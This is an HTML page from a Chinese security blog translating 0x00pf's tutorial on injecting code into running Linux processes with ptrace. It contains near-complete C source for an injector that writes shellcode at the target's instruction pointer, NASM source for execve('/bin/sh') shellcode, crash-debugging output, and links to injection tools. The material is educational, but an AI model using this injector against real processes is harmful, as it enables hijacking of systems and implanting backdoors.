@@ -1,0 +1,1276 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back(-1);
+                <!--window.location.href='https://kevien.github.io'-->;
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="12345译文声明本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097第一篇翻译的文章，如有不当，那也没有什么办法0.0主要是在工作中遇到了一个需要注入的场景就学习了一下。 前言 我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux进程注入(-)">
+<meta property="og:url" content="http://kevien.github.io/2018/01/28/linux进程注入/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:description" content="12345译文声明本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097第一篇翻译的文章，如有不当，那也没有什么办法0.0主要是在工作中遇到了一个需要注入的场景就学习了一下。 前言 我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我">
+<meta property="og:image" content="http://kevien.github.io/2018/01/28/linux进程注入/testinject.png">
+<meta property="og:image" content="http://kevien.github.io/2018/01/28/linux进程注入/poc.png">
+<meta property="og:updated_time" content="2018-03-20T16:13:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux进程注入(-)">
+<meta name="twitter:description" content="12345译文声明本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097第一篇翻译的文章，如有不当，那也没有什么办法0.0主要是在工作中遇到了一个需要注入的场景就学习了一下。 前言 我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我">
+<meta name="twitter:image" content="http://kevien.github.io/2018/01/28/linux进程注入/testinject.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/2018/01/28/linux进程注入/"/>
+
+
+
+
+
+  <title>linux进程注入(-) | M0rk's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/28/linux进程注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                linux进程注入(-)
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-28T17:18:28+08:00">
+                2018-01-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
+<li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
+<li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上面。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多的花销。因为这个原因，所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li>
+<li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li>
+<li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’的且正在运行的进程中。</li>
+<li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节吧。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li>
+<li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li>
+<li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li>
+<li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li>
+<li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li>
+<li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
+<li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/ptrace.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/user.h&gt;</div><div class="line">#include &lt;sys/reg.h&gt;</div><div class="line"></div><div class="line">int</div><div class="line">main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">  pid_t                   target;</div><div class="line">  struct user_regs_struct regs;</div><div class="line">  int                     syscall;</div><div class="line">  long                    dst;</div><div class="line"></div><div class="line">  if (argc != 2)</div><div class="line">    &#123;</div><div class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  target = atoi (argv[1]);</div><div class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</div><div class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(ATTACH):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Waiting for process...\n&quot;);</div><div class="line">  wait (NULL);</div></pre></td></tr></table></figure>
+<ul>
+<li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
+<li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
+<li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li>
+<li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li>
+</ul>
+<ol>
+<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li>
+<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
+<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
+<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
+</ol>
+<ul>
+<li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
+<li><p>下面的代码注入我们的“恶意代码”到目标进程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">printf (&quot;+ Getting Registers\n&quot;);</div><div class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">  &#123;</div><div class="line">    perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">    exit (1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</div><div class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</div><div class="line">regs.rip += 2;</div></pre></td></tr></table></figure>
+</li>
+<li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
+</li>
+<li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
+<li><p>让我们看看是怎么样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</div><div class="line">&#123;</div><div class="line">  int      i;</div><div class="line">  uint32_t *s = (uint32_t *) src;</div><div class="line">  uint32_t *d = (uint32_t *) dst;</div><div class="line"></div><div class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</div><div class="line">    &#123;</div><div class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</div><div class="line">	  return -1;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
+</li>
+</ul>
+<ol>
+<li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li>
+<li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li>
+</ol>
+<ul>
+<li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</div><div class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Run it!\n&quot;);</div><div class="line"> </div><div class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(DETACH):&quot;);</div><div class="line">	  exit (1);</div><div class="line">	&#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
+</li>
+<li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li>
+<li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易去发现，我来告诉你们，来满足大家的好奇心。</li>
+<li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个原因是我的目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
+<li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧;）,所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ Tracing process 15333</div><div class="line">+ Waiting for process...</div><div class="line">+ Getting Registers</div><div class="line">+ Injecting shell code at 0x7ffe9a708728</div><div class="line">+ Setting instruction pointer to 0x7ffe9a708708</div><div class="line">+ Run it!</div></pre></td></tr></table></figure>
+<ul>
+<li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb ./target core</div><div class="line">(... gdb start up messages removed ...)</div><div class="line">Reading symbols from ./target...(no debugging symbols found)...done.</div><div class="line">[New LWP 15333]</div><div class="line">Core was generated by `./target&apos;.</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">#0  0x00007ffe9a708706 in ?? ()</div></pre></td></tr></table></figure>
+<ul>
+<li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
+<li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;   </div><div class="line">    int i;</div><div class="line"></div><div class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</div><div class="line">    for(i = 0;i &lt; 10; ++i) &#123;</div><div class="line"></div><div class="line">	write (1, &quot;Hello World\n&quot;, 12);</div><div class="line">        sleep(2);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">        global _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        xor rax,rax</div><div class="line">        mov rdx,rax             ; No Env</div><div class="line">        mov rsi,rax             ; No argv</div><div class="line">        lea rdi, [rel msg]</div><div class="line"></div><div class="line">        add al, 0x3b</div><div class="line"></div><div class="line">        syscall</div><div class="line">        msg db &apos;/bin/sh&apos;,0</div></pre></td></tr></table></figure>
+<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
+<li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
+<li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
+<li>1.修改注入代码到代码空隙</li>
+<li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
+<li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
+<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="external">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li>
+<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="external">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
+<li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/30/reverse-shell的几种方式/" rel="next" title="reverse shell的几种方式">
+                <i class="fa fa-chevron-left"></i> reverse shell的几种方式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/16/从一道pentesterlab的题目说起/" rel="prev" title="从一道pentesterlab的题目说起">
+                从一道pentesterlab的题目说起 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//kevien.github.io/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
